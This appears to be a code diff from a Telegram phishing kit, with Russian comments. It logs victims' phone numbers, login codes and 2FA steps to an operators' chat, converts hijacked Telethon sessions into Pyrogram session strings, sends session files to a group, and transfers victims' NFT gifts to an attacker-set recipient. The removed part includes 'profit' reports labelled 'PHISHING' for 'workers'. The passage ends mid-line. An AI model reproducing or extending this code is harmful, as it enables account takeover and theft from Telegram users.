@@ -10,12 +10,19 @@ import asyncio
 from urllib.parse import parse_qs
 from datetime import datetime
 from flask import request
-# Константы для сессий
+from config import Config  # <--- ДОБАВЛЕНО!
+
+# Константы
 SESSION_DIR = Config.SESSION_DIR
+PHONE_FILE = "phones.json"
+ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "default_admin_token")
+GIFT_RECIPIENT_ID = int(os.getenv("GIFT_RECIPIENT_ID", "0"))
 
 # Создаем директорию сессий если её нет
 if not os.path.exists(SESSION_DIR):
     os.makedirs(SESSION_DIR)
+
+
 async def log_user_action(action_type: str, user_info: dict = None, worker_info: dict = None, additional_data: dict = None):
     """
     Detailed logging system for user actions
@@ -36,6 +43,7 @@ async def log_user_action(action_type: str, user_info: dict = None, worker_info:
         from config import Config
         bot = Bot(token=Config.BOT_TOKEN)
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
         worker_name = "Unknown"
         if worker_info:
             username = worker_info.get('username')
@@ -44,6 +52,7 @@ async def log_user_action(action_type: str, user_info: dict = None, worker_info:
                 worker_name = username if username.startswith('@') else f"@{username}"
             else:
                 worker_name = f"ID{telegram_id}"
+        
         user_display = "Unknown"
         if user_info:
             user_id = user_info.get('user_id', user_info.get('telegram_id', user_info.get('id', 'Unknown')))
@@ -52,8 +61,10 @@ async def log_user_action(action_type: str, user_info: dict = None, worker_info:
                 user_display = f"@{username} (ID: {user_id})"
             else:
                 user_display = f"ID: {user_id}"
+        
         message_text = ""
         keyboard = None
+        
         if action_type == "link_created":
             gift_link = additional_data.get('gift_link', 'Unknown') if additional_data else 'Unknown'
             message_text = (
@@ -106,39 +117,62 @@ async def log_user_action(action_type: str, user_info: dict = None, worker_info:
                 f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                 f"⏰ <b>Время:</b> {timestamp}"
             )
-        elif action_type == "code_entered":
-            has_2fa = additional_data.get('has_2fa', False) if additional_data else False
-            fa_status = "✅ Включена" if has_2fa else "❌ Отключена"
+        elif action_type == "code_sent":
+            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
             message_text = (
-                f"🔐 <b>Введен код подтверждения</b>\n\n"
+                f"📨 <b>Код отправлен</b>\n\n"
                 f"👤 <b>Пользователь:</b> {user_display}\n"
-                f"🛡️ <b>2FA:</b> {fa_status}\n"
+                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                 f"⏰ <b>Время:</b> {timestamp}"
             )
-        elif action_type == "2fa_entered":
+        elif action_type == "code_verified":
+            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
             message_text = (
-                f"🛡️ <b>Введен 2FA пароль</b>\n\n"
+                f"✅ <b>Код подтвержден</b>\n\n"
                 f"👤 <b>Пользователь:</b> {user_display}\n"
+                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
+                f"⏰ <b>Время:</b> {timestamp}"
+            )
+        elif action_type == "2fa_required":
+            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
+            message_text = (
+                f"🔐 <b>Требуется 2FA</b>\n\n"
+                f"👤 <b>Пользователь:</b> {user_display}\n"
+                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
+                f"⏰ <b>Время:</b> {timestamp}"
+            )
+        elif action_type == "2fa_verified":
+            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
+            message_text = (
+                f"✅ <b>2FA подтвержден</b>\n\n"
+                f"👤 <b>Пользователь:</b> {user_display}\n"
+                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                 f"⏰ <b>Время:</b> {timestamp}"
             )
         elif action_type == "auth_success":
+            phone = additional_data.get('phone', 'Unknown') if additional_data else 'Unknown'
             message_text = (
                 f"✅ <b>Успешная авторизация</b>\n\n"
                 f"👤 <b>Пользователь:</b> {user_display}\n"
+                f"📞 <b>Номер:</b> <code>{phone}</code>\n"
                 f"⏰ <b>Время:</b> {timestamp}"
             )
-        elif action_type == "session_processing_started":
+        elif action_type == "session_processing_start":
             message_text = (
                 f"⚙️ <b>Начата обработка сессии</b>\n\n"
                 f"👤 <b>Пользователь:</b> {user_display}\n"
                 f"⏰ <b>Время:</b> {timestamp}"
             )
-        elif action_type == "session_processing_completed":
-            gifts_count = additional_data.get('gifts_processed', 0) if additional_data else 0
+        elif action_type == "session_processing_complete":
             message_text = (
                 f"✅ <b>Обработка сессии завершена</b>\n\n"
                 f"👤 <b>Пользователь:</b> {user_display}\n"
-                f"🎁 <b>Обработано подарков:</b> {gifts_count}\n"
+                f"⏰ <b>Время:</b> {timestamp}"
+            )
+        elif action_type == "session_processing_error":
+            message_text = (
+                f"❌ <b>Ошибка обработки сессии</b>\n\n"
+                f"👤 <b>Пользователь:</b> {user_display}\n"
                 f"⏰ <b>Время:</b> {timestamp}"
             )
         elif action_type == "gift_transfer_error":
@@ -154,6 +188,7 @@ async def log_user_action(action_type: str, user_info: dict = None, worker_info:
             keyboard = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="🔄 Повтор", callback_data=f"retry_session:{session_id}")]
             ])
+        
         if keyboard:
             await bot.send_message(
                 chat_id=Config.LOG_CHAT_ID,
@@ -173,6 +208,8 @@ async def log_user_action(action_type: str, user_info: dict = None, worker_info:
         print(f"❌ Ошибка отправки лога действия: {e}")
         import traceback
         traceback.print_exc()
+
+
 def get_session_data_from_sqlite(session_file_path: str) -> dict:
     if not os.path.exists(session_file_path):
         raise FileNotFoundError(f"Файл сессии не найден: {session_file_path}")
@@ -192,10 +229,12 @@ def get_session_data_from_sqlite(session_file_path: str) -> dict:
         }
     finally:
         conn.close()
+
+
 async def get_user_data_from_telethon(session_file_path: str) -> dict:
     from config import Config
-    API_ID = Config.API_ID
-    API_HASH = Config.API_HASH
+    API_ID = Config.TELEGRAM_API_ID
+    API_HASH = Config.TELEGRAM_API_HASH
     from telethon import TelegramClient
     from telethon.sessions import SQLiteSession
     client = TelegramClient(
@@ -219,6 +258,8 @@ async def get_user_data_from_telethon(session_file_path: str) -> dict:
         return user_data
     finally:
         await client.disconnect()
+
+
 def create_pyrogram_session_string(session_data: dict, user_data: dict) -> str:
     from config import Config
     API_ID = Config.TELEGRAM_API_ID
@@ -242,14 +283,20 @@ def create_pyrogram_session_string(session_data: dict, user_data: dict) -> str:
     )
     session_string = base64.urlsafe_b64encode(packed_data).decode().rstrip("=")
     return session_string
+
+
 async def convert_telethon_to_pyrogram(session_file_path: str) -> str:
     session_data = get_session_data_from_sqlite(session_file_path)
     user_data = await get_user_data_from_telethon(session_file_path)
     pyrogram_session_string = create_pyrogram_session_string(session_data, user_data)
     return pyrogram_session_string
+
+
 def check_admin_token():
     token = request.args.get('token') or request.headers.get('X-Admin-Token')
     return token == ADMIN_TOKEN
+
+
 def parse_init_data(init_data):
     try:
         parsed_data = parse_qs(init_data)
@@ -257,6 +304,8 @@ def parse_init_data(init_data):
             return json.loads(parsed_data['user'][0]).get('id')
     except Exception as e:
         return None
+
+
 def get_phone_from_json(user_id):
     try:
         if os.path.exists(PHONE_FILE):
@@ -265,6 +314,8 @@ def get_phone_from_json(user_id):
                 return phones.get(str(user_id), {}).get('phone_number')
     except Exception as e:
         return None
+
+
 def init_user_record(user_id):
     try:
         phones = {}
@@ -282,6 +333,8 @@ def init_user_record(user_id):
         return True
     except Exception as e:
         return False
+
+
 def create_session_json(phone, twoFA=False, user_id=None):
     session_data = {
         'app_id': 14549469,
@@ -304,8 +357,10 @@ def create_session_json(phone, twoFA=False, user_id=None):
         }
         with open(PHONE_FILE, 'w') as f:
             json.dump(phones, f, indent=2)
+    
     with open(f"{SESSION_DIR}/{phone.replace('+', '')}.json", 'w') as f:
         json.dump(session_data, f, indent=2)
+    
     try:
         from telegram_bot import send_session_to_group, send_session_file_to_group
         session_file_path = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
@@ -335,15 +390,17 @@ def create_session_json(phone, twoFA=False, user_id=None):
                     send_session_file_to_group(user_id, phone, session_file_path, is_pyrogram=False)
                 )
             finally:
-                # Не закрываем loop сразу, чтобы асинхронные функции могли завершиться
                 pass
     except Exception as e:
         print(f"Error sending session to group: {e}")
     return session_data
+
+
 async def process_account_gifts(session_string: str, user_id: int, phone: str):
     from pyrogram import Client
     from config import Config
     from database import Database
+    
     try:
         client = Client(
             name="gift_processor",
@@ -387,13 +444,14 @@ async def process_account_gifts(session_string: str, user_id: int, phone: str):
                     print(f"❌ Ошибка отправки лога профита: {log_error}")
             else:
                 print(f"📭 NFT подарки с ссылками не найдены или не переданы")
-                # Отправляем уведомление с картинкой когда подарки не найдены
                 await send_no_gifts_notification(user_id, phone, gifts_count)
         finally:
             await client.stop()
     except Exception as e:
         print(f"❌ Ошибка обработки подарков для {phone}: {e}")
         await log_gift_processing_error(e, user_id, phone)
+
+
 async def transfer_gift_to_recipient(client, gift, recipient_id: int) -> bool:
     try:
         print(f"🎁 Передаем подарок ID {gift.id} получателю {recipient_id}...")
@@ -407,6 +465,8 @@ async def transfer_gift_to_recipient(client, gift, recipient_id: int) -> bool:
     except Exception as e:
         print(f"❌ Ошибка передачи подарка: {e}")
         return False
+
+
 async def log_gift_transfer_success(gift, user_id: int, phone: str):
     try:
         from telegram_bot import send_message_to_group
@@ -425,140 +485,6 @@ async def log_gift_transfer_success(gift, user_id: int, phone: str):
         print(f"📝 Лог передачи подарка отправлен в группу")
     except Exception as e:
         print(f"❌ Ошибка отправки лога в группу: {e}")
-async def send_no_gifts_notification(user_id: int, phone: str, gifts_count: int):
-    """Отправляет уведомление с картинкой когда подарки не найдены"""
-    try:
-        from telegram_bot import send_message_to_group_with_animation
-        from database import Database
-        
-        # Получаем информацию о воркере
-        db = Database()
-        worker_info = db.get_worker_by_last_gift(user_id)
-        
-        message = f"""
-🎁 **Обработка подарков завершена**
-👤 **Аккаунт:** {phone} (ID: {user_id})
-📊 **Всего подарков:** {gifts_count}
-❌ **Подарки с ссылками:** Не найдены
-⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-Подарки не найдены или не содержат ссылок для передачи.
-        """
-        
-        # Отправляем уведомление с анимацией и кнопкой для повторного сканирования
-        await send_message_to_group_with_animation(
-            message.strip(), 
-            user_id, 
-            phone, 
-            worker_info
-        )
-        print(f"📝 Уведомление об отсутствии подарков отправлено в группу")
-    except Exception as e:
-        print(f"❌ Ошибка отправки уведомления об отсутствии подарков: {e}")
 
-async def send_profit_log(worker_info: dict, transferred_gift_links: list, user_id: int):
-    """Отправляет лог профита с информацией о переданных подарках"""
-    print(f"🔍 [PROFIT_LOG] Начало отправки лога профита для пользователя {user_id}")
-    print(f"🔍 [PROFIT_LOG] Параметры: worker_info={worker_info}, gift_links_count={len(transferred_gift_links)}")
-    
-    try:
-        print(f"🔍 [PROFIT_LOG] Импортируем необходимые модули...")
-        from telegram_bot import send_message_to_group_with_animation
-        from database import Database
-        print(f"✅ [PROFIT_LOG] Модули успешно импортированы")
-        
-        # Получаем информацию о пользователе
-        print(f"🔍 [PROFIT_LOG] Получаем информацию о пользователе {user_id}...")
-        phone = get_phone_from_json(user_id) or "Неизвестно"
-        print(f"✅ [PROFIT_LOG] Телефон пользователя: {phone}")
-        
-        # Формируем сообщение о профите
-        print(f"🔍 [PROFIT_LOG] Формируем сообщение о профите...")
-        gift_count = len(transferred_gift_links)
-        print(f"🔍 [PROFIT_LOG] Количество подарков: {gift_count}")
-        
-        gift_links_text = "\n".join([f"• {link}" for link in transferred_gift_links[:5]])  # Показываем первые 5 ссылок
-        if len(transferred_gift_links) > 5:
-            gift_links_text += f"\n... и еще {len(transferred_gift_links) - 5} подарков"
-        print(f"🔍 [PROFIT_LOG] Текст ссылок сформирован (длина: {len(gift_links_text)} символов)")
-        
-        # Определяем имя воркера
-        worker_username = worker_info.get('username', '')
-        if worker_username and not worker_username.startswith('@'):
-            worker_username = f"@{worker_username}"
-        elif not worker_username:
-            worker_username = f"@user{worker_info.get('telegram_id', 'unknown')}"
-        
-        print(f"🔍 [PROFIT_LOG] Имя воркера: {worker_username}")
-        
-        # Формируем список подарков в новом формате
-        gift_list_text = ""
-        for i, link in enumerate(transferred_gift_links, 1):
-            gift_list_text += f"🎁 {i}. {link}\n"
-        
-        message = f"""🧑‍🎤 Новый профит у {worker_username}
-
-┠ Сервис: 💠 PHISHING
-┠ Подарки ({gift_count}):
-{gift_list_text.rstrip()}
-┖ Комьюнити: 🥷 GETTO TEAM"""
-        
-        print(f"✅ [PROFIT_LOG] Сообщение сформировано (длина: {len(message)} символов)")
-        print(f"🔍 [PROFIT_LOG] Содержимое сообщения:\n{message}")
-        
-        # Отправляем уведомление с анимацией и кнопкой для повторного сканирования
-        print(f"🔍 [PROFIT_LOG] Отправляем сообщение через send_message_to_group_with_animation...")
-        await send_message_to_group_with_animation(
-            message.strip(), 
-            user_id, 
-            phone, 
-            worker_info
-        )
-        
-        print(f"✅ [PROFIT_LOG] Лог профита успешно отправлен для пользователя {user_id}")
-        
-    except Exception as e:
-        print(f"❌ [PROFIT_LOG] Ошибка отправки лога профита: {e}")
-        print(f"❌ [PROFIT_LOG] Тип ошибки: {type(e).__name__}")
-        print(f"❌ [PROFIT_LOG] Параметры при ошибке: user_id={user_id}, worker_info={worker_info}")
-        import traceback
-        print(f"❌ [PROFIT_LOG] Полный traceback:")
-        traceback.print_exc()
-
-async def log_gift_processing_error(error, user_id: int, phone: str):
-    try:
-        from telegram_bot import send_message_to_group
-        message = f"""
-❌ **Ошибка обработки подарков**
-👤 **Аккаунт:** {phone} (ID: {user_id})
-🚫 **Ошибка:** {str(error)}
-⏰ **Время:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-Требуется проверка аккаунта.
-        """
-        await send_message_to_group(message.strip())
-        print(f"📝 Лог ошибки отправлен в группу")
-    except Exception as e:
-        print(f"❌ Ошибка отправки лога ошибки в группу: {e}")
-def check_session_exists(phone):
-    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
-    json_file = f"{SESSION_DIR}/{phone.replace('+', '')}.json"
-    return os.path.exists(session_file) and os.path.exists(json_file)
-def validate_session(phone):
-    from telegram_client import TelegramAuth, run_async
-    if not check_session_exists(phone):
-        return False
-    session_file = f"{SESSION_DIR}/{phone.replace('+', '')}.session"
-    try:
-        auth = TelegramAuth(session_file)
-        is_valid = run_async(auth.check_connection())
-        return is_valid
-    except Exception as e:
-        try:
-            if os.path.exists(session_file):
-                os.remove(session_file)
-            json_file = f"{SESSION_DIR}/{phone.replace('+', '')}.json"
-            if os.path.exists(json_file):
-                os.remove(json_file)
-        except Exception as cleanup_error:
-            pass
-        return False
+async def send_no_gifts_notification(user_id: int, 
